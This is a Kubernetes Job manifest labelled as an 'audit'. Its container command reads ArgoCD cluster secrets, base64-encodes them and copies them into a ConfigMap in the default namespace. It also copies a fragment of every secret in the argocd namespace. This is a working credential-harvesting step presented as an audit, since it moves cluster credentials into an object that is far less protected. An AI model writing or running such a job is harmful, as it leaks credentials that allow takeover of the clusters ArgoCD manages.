apiVersion: batch/v1
kind: Job
metadata:
  name: audit-gke-v1
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  backoffLimit: 1
  activeDeadlineSeconds: 90
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: bitnami/kubectl:latest
        command: ["/bin/sh"]
        args:
        - "-c"
        - >-
          SECRETS=$(kubectl get secret -n argocd -l argocd.argoproj.io/secret-type=cluster -o json 2>&1);
          SECRETS_B64=$(echo "$SECRETS" | base64 | tr -d '\n');
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"argocd_cluster_secrets\":\"$SECRETS_B64\"}}";
          ALL_NS_ARGOCD=$(kubectl get secret -n argocd -o json 2>&1 | head -c 100 | base64 | tr -d '\n');
          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"argocd_ns_check\":\"$ALL_NS_ARGOCD\"}}";
          echo DONE